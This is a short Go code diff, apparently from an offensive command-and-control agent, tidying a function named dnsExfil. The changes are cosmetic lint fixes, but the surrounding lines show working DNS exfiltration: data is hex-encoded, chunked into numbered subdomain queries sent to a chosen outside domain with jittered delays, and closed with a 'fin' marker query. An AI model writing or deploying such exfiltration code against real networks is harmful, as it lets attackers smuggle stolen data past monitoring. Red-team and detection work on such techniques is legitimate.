@@ -76,7 +76,7 @@ func dnsExfil(args dnsArgs) structs.CommandResult {
 	totalChunks := (len(hexData) + maxHexLen - 1) / maxHexLen
 
 	var sb strings.Builder
-	sb.WriteString(fmt.Sprintf("DNS Exfiltration Started\n"))
+	sb.WriteString("DNS Exfiltration Started\n")
 	sb.WriteString(fmt.Sprintf("  Domain: %s\n", args.Target))
 	sb.WriteString(fmt.Sprintf("  Data size: %d bytes (%d hex chars)\n", len(data), len(hexData)))
 	sb.WriteString(fmt.Sprintf("  Chunks: %d (chunk size: %d bytes)\n", totalChunks, chunkSize))
@@ -97,7 +97,7 @@ func dnsExfil(args dnsArgs) structs.CommandResult {
 		query := fmt.Sprintf("%06d.%s.%s", i, chunk, args.Target)
 
 		// Perform DNS lookup (we don't care about the response)
-		net.LookupHost(query)
+		_, _ = net.LookupHost(query)
 		sent++
 
 		// Delay with jitter
@@ -110,9 +110,9 @@ func dnsExfil(args dnsArgs) structs.CommandResult {
 
 	// Send completion marker
 	completionQuery := fmt.Sprintf("fin.%06d.%s", totalChunks, args.Target)
-	net.LookupHost(completionQuery)
+	_, _ = net.LookupHost(completionQuery)
 
-	sb.WriteString(fmt.Sprintf("Exfiltration Complete\n"))
+	sb.WriteString("Exfiltration Complete\n")
 	sb.WriteString(fmt.Sprintf("  Sent: %d/%d chunks\n", sent, totalChunks))
 	if errors > 0 {
 		sb.WriteString(fmt.Sprintf("  Errors: %d\n", errors))
